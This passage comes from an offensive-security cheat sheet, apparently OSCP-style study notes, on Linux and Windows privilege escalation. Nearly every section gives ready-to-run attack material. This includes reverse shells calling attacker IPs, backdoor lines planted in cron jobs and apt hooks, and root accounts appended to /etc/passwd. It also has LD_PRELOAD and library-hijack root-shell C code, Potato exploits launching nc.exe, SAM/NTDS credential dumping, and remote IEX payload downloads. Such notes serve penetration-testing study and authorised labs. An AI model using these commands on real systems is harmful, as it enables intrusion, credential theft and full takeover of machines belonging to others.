crontab -l
sudo crontab -l

# enumerate installed applications and patch levels
dpkg -l

# find all writable files
find / -writable -type d 2>/dev/null

# find all writable files in /etc
find /etc -maxdepth 1 -writable -type f

# find all readable files in /etc
find /etc -maxdepth 1 -readable -type f

# enumerate readable/writable files and directories
find / -writable -type d 2> /dev/null

# enumerate unmounted disks
cat /etc/fstab
mount
/bin/lsblk
lsblk

# enumerate device drivers and kernel modules
lsmod
/sbin/modinfo libata

# enumerating binaries that AutoElevate
find / -perm -u=s -type f 2>/dev/null

# find SSH private keys
find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null

```


### Reverse Shell

**PHP**
```php
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Python**

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**Bash**
```bash
#!/bin/bash
/usr/bin/bash -i >& /dev/tcp/192.168.45.226/445 0>&1
```


**More shells**
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Generator](https://www.revshells.com/)
- [Upgrade a Dumb Shell to a Fully Interactive Shell for More Flexibility](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)
  - `python -c 'import pty;pty.spawn("/bin/bash")'`
  - `/usr/bin/script -qc /bin/bash /dev/null`

### Service Exploits

- `ps aux | grep "^root"` Show all process running as root
- Identify the program version with `<program> --version` or `<program> -v`
  - On Debian like systems, run ` dpkg -l | grep <program>`
  - On systems that use rpm, run `rpm –qa | grep <program>`

**Check services running on localhost**
- `netstat -tlpn`
- `ss -antp`
- `ps -auxwf`

**Check which services run as root**
- ```
  find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
  ps -aux | grep root | grep sql
  ss -antp
  ```
- note: if you find `relayd`
  - `/usr/sbin/relayd -C /etc/shadow`
  - now you can read `/etc/shadow`

**MySQL service running as root with no password assigned**
- Run `mysqld --version`
- One great exploit is the following: [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
  - Once the UDF is installed, run the following command in the MySQL shell: `mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');`
  - Run `/tmp/rootbash` for a root shell: `/tmp/rootbash -p`

### Weak File Permissions

**Readable /etc/shadow**
- Check if `/etc/shadow` is readable with `ls -l /etc/shadow`
- ```
  cat /etc/shadow > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- shadow + passwd
  ```
  unshadow passwd shadow > passwords
  john --wordlist=/usr/share/wordlists/rockyou.txt passwords
  ```

**Readable /etc/passwd**
- if you find hashes
  ```
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
  ```

**Writable /etc/shadow**
- Check if `/etc/shadow` is writable with `ls -l /etc/shadow`
- Generate a new password hash with `mkpasswd -m sha-512 newpass`
- Substitute the root password hash with the new hash with `nano /etc/shadow`

**Writable /etc/passwd**
1. Check if `/etc/passwd` is writable with `ls -l /etc/passwd`
2. Generate a new password hash with `openssl passwd newpass`
3. Substitute the root password hash with the new hash with `nano /etc/passwd`
   - or add a new root user to `/etc/passwd` with `echo 'root2:<password hash>:0:0:root:/root:/bin/bash' >> /etc/passwd`
     - test the new user with `su root2` and `id`


### Exposed Confidential Information

- `env` inspect environment variables
  - `/etc/environment`
- `cat .bashr` ispect .bashrc
- `watch -n 1 "ps -aux | grep pass"` harvest active processes for credentials
- `sudo tcpdump -i lo -A | grep "pass"` perform password sniffing
- `history`
- `cat ~/.profile`

**Password disclosure**
- `watch -n 1 "ps -aux | grep pass"`
- `sudo tcpdump -i lo -A | grep "pass"`
- search for passwords
  - `grep -rnw . -ie password --color=always 2>/dev/null`
  - `grep -rnw . -ie tom --color=always 2>/dev/null`
  - `grep -rnw . -ie DB_PASSWORD --color=always 2>/dev/null`
- check `wp-config.php` in:
  - `/var/www/html`
  - `/srv/http`

### SSH
- `find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null` find SSH keys

### Sudo

**Classic method**
- Try to run `sudo su`
- If `su` doesn't work, try with the followings
  - `sudo -s`
  - `sudo -i`
  - `sudo /bin/bash`
  - `sudo passwd`

**Shell Escape Sequences**
- `sudo -l` list the programs which sudo allows your user to run
- See [GTFOBins](https://gtfobins.github.io) and search for the program names

If you find something like the following, see if there are any services that can be restarted to have reverse shell as root
```
(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```
- sudo /sbin/reboot

Path traversal:
1. `sudo -l` > `(ALL) NOPASSWD: /usr/bin/tee /var/log/httpd/*`
2. add new user 'toor:password' > `echo "toor:$(openssl passwd password):0:0:root:/root:/bin/bash") | sudo tee /var/log/httpd/../../../etc/passwd`

**Environment Variables**
- `sudo -l` check which environment variables are inherited, look for the `env_keep` options
  - `LD_PRELOAD` loads a shared object before any others when a program is run 
  - `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first
- First solution
  - Create a shared object with `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c`, use the code below
    ```C
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
  
    void _init() {
    	unsetenv("LD_PRELOAD");
    	setresuid(0,0,0);
    	system("/bin/bash -p");
    }
    ```
  - `sudo LD_PRELOAD=/tmp/preload.so <program name>` Run one of the programs you are allowed to run via sudo while setting the `LD_PRELOAD` environment variable to the full path of the new shared object
- Second solution, with `apache`
  - See which shared libraries are used by apache `ldd /usr/sbin/apache2`
  - Create a shared object with the same name as one of the listed libraries, `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c`
  - ```C
    #include <stdio.h>
    #include <stdlib.h>
    
    static void hijack() __attribute__((constructor));
    
    void hijack() {
    	unsetenv("LD_LIBRARY_PATH");
    	setresuid(0,0,0);
    	system("/bin/bash -p");
    }
    ```
  - Run `apache2` using sudo, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`, where the output of the compiled shared object is

**sudoedit**
If you find Sudo < 1.8.15 and something like: `(root) NOPASSWD: sudoedit /home/*/*/recycler.ser`
- CVE-2015-5602, see https://al1z4deh.medium.com/proving-grounds-cassios-4686e6fa8df6

### Cron Jobs

Run:
- `cat /etc/crontab`, `crontab -l`, `pspy`
- `grep "CRON" /var/log/syslog`
- 

**File Permissions**
- View the contents of the system-wide crontab `cat /etc/crontab`, the cron log file `grep "CRON" /var/log/syslog` and see cron jobs, locate the file run with `locate <program>` and see the permissions with `ls -l <program full path>`
- If one of them is world-writable, substitute it with the following
  ```C
  #!/bin/bash
  bash -i >& /dev/tcp/<Your-IP>/4444 0>&1
  ```
  - You can also try with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Your-IP> 4444 >/tmp/f`
- Open a listener with `nc -nvlp 4444`

**PATH Environment Variable**
- See [Task 9 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- The crontab `PATH` environment variable is by default set to `/usr/bin:/bin` and can be overwritten in the crontab file
- It might be possible to create a program or script with the same name as the cron job if the program or script for a cron job does not utilize an absolute path and one of the PATH directories is editable by our user.

**Wildcards**
- See [Task 10 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- Generate a reverse shell with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`
  - make it executable `chmod +x shell.elf`
- run other commands as part of a checkpoint feature
  - `touch /home/user/--checkpoint=1`
  - `touch /home/user/--checkpoint-action=exec=shell.elf`

**apt running as root**
1. `cd /etc/apt/apt.conf.d/`
2. `echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.114 1234 >/tmp/f"};' > shell`

### SUID / SGID Executables

**setuid + GTFOBins**
- Check for setuid binaries on the machine
  - `find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null`
  - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Use [GTFOBins](https://gtfobins.github.io/) to elevate your privileges

**wget + setuid**
- You can use it to add a root user
  1. obtain `/etc/passwd` from the victim
  2. add the new user `echo "root2:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> passwd`
     - password hash generated with `openssl passwd mypass`
  3. overwrite `/etc/passwd` > `wget http://ATTACKERIP/passwd -o /etc/passwd`

**Known Exploits**
- Search for all the SUID/SGID executables on the Linux Machine `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Use [Exploit-DB](https://www.exploit-db.com/), Google and GitHub to find known exploits

**Shared Object Injection**
- See [Task 12 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- `strace <program to run> 2>&1 | grep -iE "open|access|no such file"` run strace and search the output for open/access calls and for "no such file" errors
- ```C
  #include <stdio.h>
  #include <stdlib.h>
  
  static void inject() __attribute__((constructor));
  
  void inject() {
  	setuid(0);
  	system("/bin/bash -p");
  }
  ```
  
**Environment Variables**
- See [Task 13 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)

**Abusing Shell Features (#1)**
- See [Task 14 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- > "In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."
  - ```
    function /usr/sbin/service { /bin/bash -p; }
    export -f /usr/sbin/service
    ```

**Abusing Shell Features (#2)**
- See [Task 15 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc). Note: This doesn't work on Bash versions 4.4 and above
- > "When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements."
  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <program>`
  - `/tmp/rootbash -p`

### Passwords & Keys
- View the content of history with `cat ~/.*history | less` and search for secrets
- Search for config files as they often contain passwords in plaintext or other reversible formats (example: `*.ovpn`)
- Search for backups and hidden files
  - `ls -la /` look for hidden files & directories in the system root
  - Other common locations to check
    - `ls -la /home/user`
    - `ls -la /tmp`
    - `ls -la /var/backups`
  - See [Task 18 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)

### Kernel Exploits
- Enumerate the kernel version `uname -a`
- Find an exploit, example: `searchsploit linux kernel 2.6.32 priv esc`
- Some resources
  - Find possible exploits with [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
  - [Dirty COW | CVE-2016-5195](https://dirtycow.ninja/)
  - [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)

### CVE

- see `/etc/issue`
- `cat /etc/*release*`
- CVE-2021-4034 > PwnKit Local Privilege Escalation
- Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation
- Dirty COW
  - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
  - https://dirtycow.ninja/
  - "Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka 'Dirty COW.'"
- See the general services that are running. For example, you may have found several web ports open during the initial phase, and found different services. See if there are any CVEs or exploits for PE

### find with exec
- Also known as "Abusing Setuid Binaries"
- `find /home/username/Desktop -exec "/usr/bin/bash" -p \;`
- See more here: [find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)

### find PE

- Example cron job running clean-tmp.sh:
  ```
  jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
  #! /bin/bash
  find /dev/shm -type f -exec sh -c 'rm {}' \;
  ```
  - Exploit:
    ```
    jane@assignment:~$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
    jane@assignment:~$ bash -p
    ```

### Abusing capabilities
- `/usr/sbin/getcap -r / 2>/dev/null` enumerate capabilities
  - Search for `cap_setuid+ep`, meaning that setuid capabilities are enabled, effective and permitted
- Search what you need in [GTFOBins](https://gtfobins.github.io/)
  - Example with Perl: `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`


### Escape shell

- [With tar](https://gtfobins.github.io/gtfobins/tar/#shell)
  1. create an sh with a nc command for a reverse shell > name 'exploit.sh'
  2. `touch ./"--checkpoint=1"`
  3. `touch ./"--checkpoint-action=exec=bash exploit.sh"`
- https://vk9-sec.com/linux-restricted-shell-bypass/
- https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

### Docker

**Simple Docker cheatsheet**
```shell
docker-compose up					run docker
docker ps						see running docker
docker ps -a						see every docker in the machine
docker images						see docker images installed
docker stop <docker-id>					stop a docker
docker exec -it <docker-id> bash			enter a docker
docker rmi <docker-id>					remove a docker
```

An example: [docker-tomcat-tutorial](https://github.com/softwareyoga/docker-tomcat-tutorial)

If your user is part of the 'docker' group
- find an image with `docker images`
- `docker run -v /:/mnt --rm -it IMAGE chroot /mnt sh`

Escape container
- If the first thing you see when you get access to the machine is a file `.dockerenv` and the hostname is something like `0873e8062560`, it means that you are in a docker container
- https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/

Process
1. List host's disks
   - `fdisk -l`
2. Attempt mount `disklo`
   - `mkdir /tmp/mnt1`
   - `mount /dev/sda1 /tmp/mnt1`
   - `cd /tmp/mnt1`
3. Now you can navigate `sda1` in `/tmp/mnt1`
- If you find an internal ip / service (maybe with `ifconfig`, `netstat -ano` or `cat /etc/hosts`), try this
  1. `ssh -l root 172.17.0.2`

Docker Container Escape via SNMP
- SNMP test
  1. Look for `.snmpd.conf` (maybe in `/var/backups`)
     - found community string: `rocommunity 53cur3M0NiT0riNg`
     - Found NET-SNMP-EXTEND-MIB tables (`nsExtendConfigTable`, `nsExtendOutput1Table` and `nsExtendOutput2Table`) > this means RCE
  2. `sudo download-mibs`
  3. `set mibs +ALL in /etc/snmp/snmp.conf`
  4. `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
     - notice if the query works
- docker escape
   1. VICTIM:
      ```
      echo 'bash -c "bash -i >& /dev/tcp/192.168.45.216/4444 0>&1"' > /tmp/shtest
      chmod +x /tmp/shtest
      ```
   3. ATTACKER: `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`

### User groups
- If your user is part of the group `disk`:
  1. `df -h`
  2. `debugfs /dev/sd[a-z][1-9]`  example: `sda1`
  3. `debugfs: cat /root/.ssh/id_rsa`
- group `video`: [HackTricks | Video Group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group)

### fail2ban
- See: "[Privilege Escalation with fail2ban nopasswd](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)"
- fail2ban config: `/etc/fail2ban/jail.conf`
- ```
  /etc/fail2ban/action.d/iptables-multiport.conf
  actionban = reverse shell
  ```
- trigger the ban with hydra

### Postfix

- [How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze)
- [Pg Practice Postfish writeup](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish)


## Windows Privilege Escalation

### Checklist

See [Information gathering | Windows](#windows). Always obtain:
- [ ] Username and hostname
- [ ] Group memberships of the current user
- [ ] Existing users and groups
- [ ] Operating system, version and architecture
- [ ] Network information
- [ ] Installed applications
- [ ] Running processes

### Resources
- [Windows PrivEsc | TryHackMe](https://tryhackme.com/room/windows10privesc)
- [Windows Privilege Escalation for OSCP & Beyond!](https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574)

**Tools**
- [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
- [MinGW-w64](https://www.mingw-w64.org/)
- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
- [Windows persistence](#windows-persistence)
- Scripts
  - [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
  - [Seatbelt](https://github.com/GhostPack/Seatbelt)
    - [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
      - `.\Seatbelt.exe all`
      - `.\Seatbelt.exe -group=all -full`
  - [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) (archived)
    - [SharpUp](https://github.com/GhostPack/SharpUp)
    - [SharpUp.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)
  - [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
  - [Windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
    - `windows-privesc-check2.exe -h`
    - `windows-privesc-check2.exe --dump -G`
  - [creddump7](https://github.com/Tib3rius/creddump7)
  - [Privesc](https://github.com/enjoiz/Privesc)

### Strategy

- [ ] Run the following commands
  - `whoami /priv`
  - `whoami /groups`
  - `whoami /all`
  - `netstat -ano`
  - especially seek out for services like `mssql`
- [ ] See `systeminfo` for CVE + `searchsploit`, `wes.py` and `windows-exploit-suggester.py`
  - see the dedicated sections for more inspiration + known exploits
- [ ] See if something is out of place in `C:\` and `C:\Users\username\`
- [ ] See the programs installed in their directories
- [ ] Run the scripts
  - `winPEAS`, options: `fast`, `searchfast`, and `cmd`
  - `.\seatbelt.exe NonstandardProcesses`
  - `PowerUp.ps1` -> `Invoke-AllChecks`
  - `windows-privesc-check.exe --dump -G`
  - `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`
  - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
  - `.\jaws-enum.ps1`
  - [Privesc](https://github.com/enjoiz/Privesc) -> `Invoke-PrivEsc`
  - more
    - https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194
    - https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
    - https://github.com/SnaffCon/Snaffler
- [ ] With meterpreter, you can run the module `local_exploit_suggester`
- [ ] In `C:`, run the command `dir -force` to see the hidden directories
  - one interesting directory is `PSTranscripts/Transcripts`
  - keep using `dir -force` inside of the hidden directories
- [ ] Check LOLBAS: https://lolbas-project.github.io/
- [ ] If out of ideas / luck:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  - http://pwnwiki.io/#!privesc/windows/index.md
  - https://fuzzysecurity.com/tutorials/16.html


### Information gathering

```PowerShell
<# gather information about current user #>
whoami
net user <user>
whoami /priv

<# gather user context information #>
id

<# discover other user accounts on the system #>
net user

<# discover localgroups and users in those groups#>
whoami /groups
net localgroup
net user <username>
PS C:\> Get-LocalGroupMember <group>

<# enumerate the Hostname #>
hostname

<# enumerate the Operating System Version and Architecture #>
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

<# enumerate running processes and services #>
PS C:\> Get-Process
tasklist /SVC

<# enumerate networking information #>
ipconfig /all
route print
netstat -ano

<# enumerate firewall status and rules #>
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

<# enumerate scheduled tasks #>
schtasks /query /fo LIST /v

<# enumerate installed applications and patch levels #>
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn

<# enumerate readable/writable files and directories #>
accesschk.exe -uws "Everyone" "C:\Program Files"
PS C:\> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

<# enumerate unmounted disks #>
mountvol

<# enumerate device drivers and Kernel modules #>
PS C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

<# enumerating binaries that AutoElevate #>
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

<# find interesting files #>
Get-ChildItem -Path <PATH> -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path <PATH> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path <PATH> -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

<# see history of commands #>
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Public\Transcripts\transcript01.txt

<# find secrets #>
reg query HKLM /f password /t REG_SZ /s
Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt

```

To use Event Viewer to search for events recorded by Script Block Logging:
1. Open the Event Viewer:
   - Press Windows key + R to open the Run dialog box.
   - Type `eventvwr.msc` and press Enter.
2. In the Event Viewer window, expand "Applications and Services Logs"
3. Expand the "Microsoft-Windows-PowerShell/Operational" log
4. Click on the "Filter Current Log" option on the right-hand side of the window
5. In the Filter Current Log dialog box, enter "4104" as the Event ID
6. Click on the "OK" button to apply the filter
7. The Event Viewer will now display only the events related to Script Block Logging


### Privileges
- Paper: [Abusing Token Privileges For EoP](https://github.com/hatRiot/token-priv)
- List your privileges: `whoami /priv`, see also https://github.com/gtworek/Priv2Admin
  - `SeImpersonatePrivilege`
  - `SeAssignPrimaryPrivilege`
  - `SeBackupPrivilege`
  - `SeRestorePrivilege`
  - `SeTakeOwnershipPrivilege`
  - `SeTcbPrivilege`
  - `SeCreateTokenPrivilege`
  - `SeLoadDriverPrivilege`
  - `SeDebugPrivilege`
- More privs: [FindSuspiciousPermissions.ps1](https://github.com/fashionproof/FindSuspiciousPermissions/blob/main/FindSuspiciousPermissions.ps1)

**AlwaysInstallElevated**
- You can run any `.msi`

**SeLoadDriverPrivilege**
- https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#strategy
- https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
- See also [HackTheBox Fuse](https://app.hackthebox.com/machines/Fuse)

**SetRestorePrivilege**
- `./SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"`

**SeManageVolumePrivilege**
1. `.\SeManageVolumeAbuse.exe`
2. `msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f dll -o tzres.dll`
3. `cp tzres.dll C:\Windows\System32\wbem\`

**SeImpersonatePrivilege**

PrintSpoofer
- `.\PrintSpoofer.exe -i -c powershell.exe`
- `.\PrintSpoofer.exe -i -c "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`

JuicyPotato
- `.\JuicyPotato.x86.exe -t * -p "\\10.10.14.10\Share\nc.exe 10.10.14.10 88 -e cmd.exe" -l 443`
- `.\JuicyPotato.exe -t * -p C:\User\mario\root.bat -l 9001 -c {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}`
  - In `root.bat`, use the following once at time
    ```
    whoami /all > C:\Users\Public\proof.txt   <# verify that you are authority #>
    net user Administrator abc123!            <# modify Administrator password to then login with psexec #>
    ```
  - See here for CLSID for the value of the flag `-c`: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise

Other
- `.\GodPotato-NET4.exe -cmd "\\192.168.45.156\Share\nc.exe 192.168.45.156 443 -e cmd.exe"`
  - Affected version: Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
- `.\RogueWinRM.exe -p "\\10.10.14.26\Share\nc.exe" -a "-e cmd.exe 10.10.14.26 88"`
  
  
**SeBackupPrivilege**
1. https://github.com/giuliano108/SeBackupPrivilege
   ```
   import-module .\SeBackupPrivilegeUtils.dll
   import-module .\SeBackupPrivilegeCmdLets.dll
   ```
2. `iwr -uri http://10.18.110.121/diskshadow.txt -o diskshadow.txt`
   - If you have modified `diskshadow.txt` and it doesn't work, run: `unix2dos diskshadow.txt`
3. `diskshadow /s diskshadow.txt`
4. `cd E:`
5. `robocopy /b E:\Windows\ntds . ntds.dit`
6. ```
   reg save hklm\system c:\tmp\system
   reg save hklm\sam c:\tmp\sam
   ```
7. ```
   download ntds.dit
   download system.bak
   download sam
   ```
8. `samdump2 system sam`
9. `impacket-secretsdump -ntds ntds.dit -system system LOCAL`


**SeRestorePrivelege**
1. list manual start service:
   ```
   cmd.exe /c sc queryex state=all type=service
   Get-Service | findstr -i "manual"
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "manual"} | select PathName,DisplayName,Name
   ```
2. Check seclogon, known to have manual start permissions and that can be started by all users
   ```
   reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
   cmd.exe /c sc sdshow seclogon
   - RP = Start Service / AU = All Users
   - winhelponline.com/blog/view-edit-service-permissions-windows/
   ```
3. SeRestoreAbuse exploit
   ```
   .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.238 445 -e powershell.exe"
   ```
- See also: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#shell-as-system

### Privileged Groups

- [Privileged Groups | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)

#### DnsAdmins
- https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
- `dnscmd.exe /config /serverlevelplugindll \\path\to\dll`
  - as a dll, try to use 'dns-exe-persistance.dll'
    - you have to recompile it with your IP
    - you can also use msfvenom
      - `msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll`
- Alternative
  1. `cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.34\share\da.dll`
  2. `sc.exe stop dns`
  3. `sc.exe start dns`
  
#### gMSA
- If your user is part of a group in 'PrincipalsAllowedToRetrieveManagedPassword'
  .\GMSAPasswordReader.exe --accountname 'svc_apache'
- Retrieve 'rc4_hmac' in Current Value
  evil-winrm -i 192.168.212.165 -u svc_apache$ -H 009E42B78BF6CEA5F5C067B32B99FCA6
- See accounts for Group Managed Service Account (gMSA) with Powershell
  Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

#### AD Recycle Bin
- It's a well-known Windows group. Check if your user is in this group
- Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
- Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
- See if there is any strange entry, like `cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz`. There might be a password

### Add new admin user

```C
#include <stdlib.h>
int main () {
    int i;
    i = system ("net user /add [username] [password]");
    i = system ("net localgroup administrators [username] /add");
    return 0;
}
```
- 32-bit Windows executable: `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
- 64-bit Windows executable: `x86_64-w64-mingw32-gcc -o adduser.exe adduser.c`
- Note: [32-bit and 64-bit Windows: Frequently asked questions](https://support.microsoft.com/en-us/windows/32-bit-and-64-bit-windows-frequently-asked-questions-c6ca9541-8dce-4d48-0415-94a3faa2e13d)
- verify that the user has been added with `net user`
- run `echo password | runas /savecred /user:rootevil cmd`

### Log in with another user from the same machine

```
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
```

### Generate a reverse shell

1. Generate the reverse shell on your attacker machine: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe`
2. Transfer it to the Windows machine with SMB: `sudo python3 /opt/impacket/examples/smbserver.py kali .` and then `copy \\<IP>\kali\reverse.exe C:\PrivEsc\reverse.exe`

Create a PowerShell remoting session via WinRM
